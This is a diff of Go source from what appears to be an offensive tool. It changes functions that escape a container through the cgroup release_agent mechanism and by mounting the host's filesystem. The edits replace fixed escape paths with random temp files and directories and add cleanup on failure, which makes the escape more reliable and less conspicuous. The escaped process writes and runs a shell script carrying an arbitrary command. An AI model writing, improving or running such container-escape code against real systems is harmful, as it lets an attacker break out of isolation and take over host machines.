@@ -284,8 +284,8 @@ func escapeCgroupNotify(command string) (string, string) {
 	sb.WriteString("[*] Attempting cgroup release_agent escape\n")
 
 	// Create a temp cgroup
-	cgroupDir := "/tmp/cgrp_escape"
-	if err := os.MkdirAll(cgroupDir, 0o755); err != nil {
+	cgroupDir, err := os.MkdirTemp("", "")
+	if err != nil {
 		return fmt.Sprintf("Failed to create cgroup dir: %v", err), "error"
 	}
 
@@ -322,8 +322,24 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	// Write the release_agent path
 	// We need to know our path on the host — write a script that's accessible from host
-	scriptPath := "/cmd_escape"
-	outputPath := "/output_escape"
+	scriptFile, err := os.CreateTemp("", "")
+	if err != nil {
+		_ = syscall.Unmount(cgroupDir, 0)
+		os.RemoveAll(cgroupDir)
+		return fmt.Sprintf("Failed to create script temp file: %v", err), "error"
+	}
+	scriptPath := scriptFile.Name()
+	scriptFile.Close()
+
+	outputFile, err := os.CreateTemp("", "")
+	if err != nil {
+		os.Remove(scriptPath)
+		_ = syscall.Unmount(cgroupDir, 0)
+		os.RemoveAll(cgroupDir)
+		return fmt.Sprintf("Failed to create output temp file: %v", err), "error"
+	}
+	outputPath := outputFile.Name()
+	outputFile.Close()
 
 	// Write script
 	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
@@ -441,8 +457,8 @@ func escapeMountHost(devicePath string) (string, string) {
 		}
 	}
 
-	mountPoint := "/tmp/hostfs_escape"
-	if err := os.MkdirAll(mountPoint, 0o755); err != nil {
+	mountPoint, err := os.MkdirTemp("", "")
+	if err != nil {
 		return fmt.Sprintf("Failed to create mount point: %v", err), "error"
 	}
 
